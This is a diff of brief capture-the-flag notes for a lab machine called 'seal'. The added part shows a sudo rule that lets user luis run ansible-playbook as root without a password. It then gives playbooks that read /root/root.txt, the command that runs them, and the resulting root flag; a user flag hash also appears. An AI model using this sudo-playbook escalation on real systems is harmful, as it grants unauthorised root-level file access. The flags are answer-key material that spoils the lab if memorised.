@@ -35,7 +35,6 @@ cat user.txt
 d640b7d24c41368455c4e15f492427db
 
 
-
 #root flag :
 Matching Defaults entries for luis on seal:
     env_reset, mail_badpass,
@@ -44,3 +43,32 @@ Matching Defaults entries for luis on seal:
 User luis may run the following commands on seal:
     (ALL) NOPASSWD: /usr/bin/ansible-playbook *
 
+fichier run.yml :
+- hosts: localhost
+  tasks:
+  - name: Copy Files
+    synchronize: src=/root/root.txt dest=/opt/backups/playbook copy_links=yes
+  - name: Server Backups
+    archive:
+      path: /opt/backups/files/
+      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
+  - name: Clean
+    file:
+      state: absent
+      path: /opt/backups/files/
+
+fichier test.yml:
+  - name: Check the disk usage of all the file system in the remote servers
+    hosts: localhost
+    tasks:
+      - name: Execute the cat command
+        register: dfout
+        command: "cat ./root.txt"
+
+      - debug:
+          var: dfout.stdout_lines
+
+sudo ansible-playbook test.yml
+
+root flag : 
+e972acafe072538a2854924ec65c7b4f"
